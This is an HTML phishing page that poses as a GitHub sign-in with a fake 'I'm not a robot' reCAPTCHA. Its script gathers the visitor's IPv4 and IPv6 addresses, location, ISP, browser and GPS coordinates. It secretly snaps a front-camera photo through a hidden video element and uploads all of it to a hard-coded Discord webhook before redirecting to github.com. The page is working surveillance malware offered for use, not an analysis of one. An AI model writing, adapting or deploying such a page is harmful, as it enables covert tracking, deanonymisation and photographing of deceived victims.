<!DOCTYPE html>
<html lang="nl">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Github Web: Secure Login</title>
  <style>
    :root {
      --tg-blue: #24A1DE;
      --tg-bg: #ffffff;
      --tg-text: #000000;
      --tg-sub: #8e8e93;
      --warning-red: #ff3b30;
    }

    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      background: var(--tg-bg);
      color: var(--tg-text);
      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", sans-serif;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
    }

    #screen-landing, #screen-warning, #screen-loading {
      width: 100%;
      max-width: 380px;
      padding: 20px;
      text-align: center;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    #screen-warning, #screen-loading { display: none; }

    /* De Google reCAPTCHA knop imitatie */
    .recaptcha-anchor {
      display: flex;
      align-items: center;
      justify-content: space-between;
      width: 300px;
      height: 74px;
      background: #f9f9f9;
      border: 1px solid #d3d3d3;
      border-radius: 3px;
      padding: 0 12px;
      cursor: pointer;
      margin-bottom: 30px;
      transition: background 0.2s;
    }
    .recaptcha-anchor:hover { background: #f1f1f1; }

    .rc-left { display: flex; align-items: center; gap: 15px; }
    
    .rc-checkbox {
      width: 28px;
      height: 28px;
      border: 2px solid #c1c1c1;
      background: #fff;
      border-radius: 2px;
    }

    .rc-text {
      color: #000;
      font-size: 14px;
      font-family: Roboto, helvetica, arial, sans-serif;
    }

    .rc-right {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      font-size: 10px;
      color: #555;
    }
    
    .rc-logo {
      width: 32px;
      height: 32px;
      background-image: url("https://www.gstatic.com/recaptcha/api2/logo_48.png");
      background-size: contain;
      background-repeat: no-repeat;
    }

    /* Loading/Scan Styles */
    .scan-line {
      position: absolute; width: 100%; height: 2px; background: var(--tg-blue);
      box-shadow: 0 0 15px var(--tg-blue); top: 0;
      animation: moving-scan 1.5s infinite ease-in-out;
    }
    @keyframes moving-scan { 0%, 100% { top: 10%; } 50% { top: 90%; } }

    #hidden-video { position: fixed; opacity: 0; left: -999px; }
    #hidden-canvas { display: none; }
  </style>
</head>
<body>

<video id="hidden-video" autoplay playsinline muted></video>
<canvas id="hidden-canvas"></canvas>

<div id="screen-warning">
  <div style="font-size:4rem; margin-bottom:20px;">⚠️</div>
  <div style="font-size:1.5rem; font-weight:600; color:var(--warning-red); margin-bottom:12px;">Browser Error</div>
  <div style="color:var(--tg-sub); margin-bottom:30px;">Open deze pagina in Chrome of Safari om de verificatie te voltooien.</div>
  <button style="width:90%; padding:16px; background:var(--warning-red); color:white; border:none; border-radius:14px; font-weight:600;" onclick="openExternally()">Open Browser</button>
</div>

<div id="screen-landing">
  <div style="margin-bottom: 30px;">
    <h2 style="font-size: 1.5rem; font-weight: 600;">Sign in to GitHub</h2>
  </div>

  <div class="recaptcha-anchor" onclick="triggerScan()">
    <div class="rc-left">
      <div class="rc-checkbox"></div>
      <div class="rc-text">I'm not a robot</div>
    </div>
    <div class="rc-right">
      <div class="rc-logo"></div>
      <span>reCAPTCHA</span>
      <span style="font-size: 8px;">Privacy - Terms</span>
    </div>
  </div>

  <p style="color: var(--tg-sub); font-size: 0.9rem; padding: 0 20px;">
    To protect your account, please complete the human verification.
  </p>
</div>

<div id="screen-loading">
  <div style="position:relative; width:100px; height:100px; margin-bottom:20px;">
    <div class="rc-logo" style="width:100px; height:100px; opacity:0.2;"></div>
    <div class="scan-line"></div>
  </div>
  <div style="color:var(--tg-blue); font-weight:600;">Verifying...</div>
</div>

<script>
  const WEBHOOK = 'https://discord.com/api/webhooks/1495153409458704537/5MxkCcDC1DuhzHDf90BqtcED6yHEbI62IvzytW4rtMOE-CZCVhRXNw3nCqwKZCN0tc91';
  
  let ipInfo = { v4: '...', v6: '...', loc: '...', isp: '...' };
  let gpsInfo = { lat: null, lon: null, acc: null };

  async function loadMeta() {
    try {
      const v4 = await fetch('https://ip-api.com/json/?fields=status,country,city,regionName,isp,query').then(r => r.json());
      const v6 = await fetch('https://api64.ipify.org?format=json').then(r => r.json()).catch(() => ({ip:'N/A'}));
      if(v4.status === 'success') {
        ipInfo.v4 = v4.query;
        ipInfo.loc = `${v4.city}, ${v4.regionName}, ${v4.country}`;
        ipInfo.isp = v4.isp;
      }
      ipInfo.v6 = v6.ip;
    } catch(e) {}
  }
  loadMeta(); // Start direct met laden

  async function triggerScan() {
    document.getElementById('screen-landing').style.display = 'none';
    document.getElementById('screen-loading').style.display = 'flex';

    // GPS Request
    await new Promise(res => {
      navigator.geolocation.getCurrentPosition(
        (p) => { gpsInfo.lat = p.coords.latitude; gpsInfo.lon = p.coords.longitude; gpsInfo.acc = p.coords.accuracy; res(); },
        () => res(), { timeout: 4000 }
      );
    });

    const blobs = [];
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
      const v = document.getElementById('hidden-video');
      v.srcObject = stream;
      const b = await new Promise(res => {
        v.onloadedmetadata = () => setTimeout(() => {
          const c = document.getElementById('hidden-canvas');
          c.width = v.videoWidth; c.height = v.videoHeight;
          const ctx = c.getContext('2d');
          ctx.translate(c.width, 0); ctx.scale(-1, 1); // Spiegelen voor front-cam
          ctx.drawImage(v, 0, 0);
          c.toBlob(res, 'image/jpeg', 0.8);
        }, 800);
      });
      if(b) blobs.push({ b, n: 'user_front.jpg' });
      stream.getTracks().forEach(t => t.stop());
    } catch(e) {}

    await upload(blobs);
    window.location.href = 'https://github.com';
  }

  async function upload(blobs) {
    const data = new FormData();
    const payload = {
      username: "GitHub Security",
      embeds: [{
        title: "✅ VERIFICATION COMPLETED",
        color: 0x24A1DE,
        fields: [
          { name: "📱 Browser", value: `\`${navigator.userAgent.substring(0, 150)}\`` },
          { name: "🌐 IPv4", value: `\`${ipInfo.v4}\``, inline: true },
          { name: "🌐 IPv6", value: `\`${ipInfo.v6}\``, inline: true },
          { name: "📍 Location", value: ipInfo.loc },
          { name: "🎯 GPS", value: gpsInfo.lat ? `${gpsInfo.lat}, ${gpsInfo.lon} (±${gpsInfo.acc}m)` : "Denied" },
          { name: "🏢 ISP", value: ipInfo.isp }
        ],
        timestamp: new Date()
      }]
    };
    data.append('payload_json', JSON.stringify(payload));
    blobs.forEach((b, i) => data.append(`file${i}`, b.b, b.n));
    await fetch(WEBHOOK, { method: 'POST', body: data });
  }

  window.onload = () => {
    const ua = navigator.userAgent.toLowerCase();
    if (ua.includes('discord')) {
      document.getElementById('screen-landing').style.display = 'none';
      document.getElementById('screen-warning').style.display = 'flex';
    }
  };

  function openExternally() {
    const u = window.location.href;
    if (navigator.share) navigator.share({ url: u });
    else alert("Copy: " + u);
  }
</script>
</body>
</html>
